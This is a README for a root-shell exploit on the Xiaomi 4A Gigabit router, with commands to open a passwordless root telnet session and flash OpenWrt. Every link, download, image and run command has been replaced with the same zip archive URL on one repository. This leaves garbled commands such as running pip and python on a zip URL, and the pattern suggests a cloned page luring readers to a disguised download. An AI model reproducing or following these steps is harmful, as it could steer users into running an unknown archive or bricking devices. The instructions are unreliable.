# Root shell exploit for the router Xiaomi 4A Gigabit Global Edition, firmware version 2.28.132

## How to run

**NOTE: FROM VERSION `0.0.2` THE ROUTER NEEDS INTERNET ACCESS**. If you require to run the exploit without internet access please try version `0.0.1`. Find the versions here: https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip

```shell
pip3 install -r https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip # Install requirements
python3 https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip # Run the script
```

After that, a letnet server will be up and running on the router. You can connect to it by running:

```
telnet <router_ip_address>
```

* User: root
* Password: none (just hit enter)

The script also starts an ftp server at port 21, so you can get access to the filesystem using a GUI (for example [cyberduck](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)).

## Install OpenWrt

When installing OpenWrt on the Xiaomi 4A Gigabit, you may use:

* An OpenWrt sapshot image that is known to work with the router (downloaded from the official OpenWrt releases portal on the 2020/04/15 and hosted in this repository). The image flashes and boots correctly, but there are some known and major connectivity problems mentioned [here](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip): 

  * Link: https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip
  * sha: `245dfe344b9be74121574d37fd5096da2beb9a52dfd4e7903e8f2313414ffc03`

* The latest snapshot from OpenWrt. At the moment, [there are important changes being implemented on OpenWrt](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip), and this image may or may not work, and could brick your device: https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip
* Other images provided by OpenWrt users (at your own risk): [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip). For example:

  * User [zorro](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) provided https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip ([OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip))
   * User [zorro](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) provided https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip ([OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip))
 
* Wait until there is a stable release of OpenWrt

If **after reading above text** you still want to proceed, after login to the router through telnet run the following commands:

```shell
cd /tmp
curl https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip --output https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip # Put here the URL you want to use to download the firmware
./busybox sha256sum https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip # Verify the firmware checksum before flashing, very important to avoid bricking your device!
mtd -e OS1 -r write https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip OS1 # Install OpenWrt
```

This will install the snapshot version of OpenWrt (without Luci). You can now use ssh to connect to the router (and install Luci if you prefer it).

### Performance:

Some users have reported worse WIFI performance in OpenWrt than in the stock firmware. See the following links:

* [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)

## Other supported routers or firmware versions

* MiRouter 4A Gigabit: user [ksc91u](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) claims that this method also works on firmware version `2.28.62`: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip).
* MiRouter 4A 100M (non gigabit): user [morhimi](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) claims that this method works on firmware version `2.18.51`: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip). User [Jeffpeng](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) claims that this method works on firmware version `2.18.58`: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip).
* MiRouter 4C: user [Jeffpeng](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) claims that this method works on firmware version `2.14.81`: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip).
* Mi Router 3Gv2: user [Massimiliano Mangoni](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) claims that this method also works on firmware version `2.28.8` (message posted in Slack).
* Mi Router 4Q (aka R4C): user cadaverous claims that this method also works on firmware version `2.28.48` (message posted in Slack), but because the router is mips architecture (not mipsel), he needed to use version `0.0.1` of the script (the other versions use a busybox binary built for the mipsel architecture that is used to start a telnet sever).

## For more info and support go to:

* [OpenWrt forum thread](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* [Slack workspace](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)

## If you brick your device

You can find solutions in the following links:

* User [albertcp](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) posted a very detailed guide: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* User [micky0867](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip) has some more comments about the topic: [OpenWrt forum](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)

## Acknowledgments

* Original vulnerabilities and exploit: [UltramanGaia](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* Instructions to install OpenWrt after exploit execution: [rogerpueyo](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
* Testing and detailed install instructions: [hey07](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)

## Demo

### Version 0.0.2 and higher: telnet

![Alt Text](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)

### Version 0.0.1: netcat (legacy)

![Alt Text](https://raw.githubusercontent.com/shourav143/OpenWRTInvasion/master/extras/language/OpenWRTInvasion-v3.5.zip)
